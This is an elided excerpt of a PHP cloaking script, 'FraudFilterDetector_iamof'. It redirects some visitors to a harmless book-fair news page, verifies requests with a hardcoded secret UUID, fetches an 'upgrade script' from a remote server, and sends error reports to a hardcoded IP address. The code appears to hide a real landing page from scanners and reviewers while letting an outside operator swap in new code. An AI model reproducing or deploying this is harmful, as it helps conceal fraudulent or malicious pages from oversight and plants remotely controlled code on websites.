...
class FraudFilterDetector_iamof {
    ...
    function isSignatureValid($sign, $time) {
        $str = '28a7ff46-3c6f-45d2-90d0-4bc1ce2ba532.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.buchmesse.de/en/news/games-book-trade-vlb');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 28a7ff46-3c6f-45d2-90d0-4bc1ce2ba532',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 28a7ff46-3c6f-45d2-90d0-4bc1ce2ba532';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 28a7ff46-3c6f-45d2-90d0-4bc1ce2ba532';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=iamof&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_iamof = new FraudFilterDetector_iamof();
$fraudFilterDetector_iamof->check();
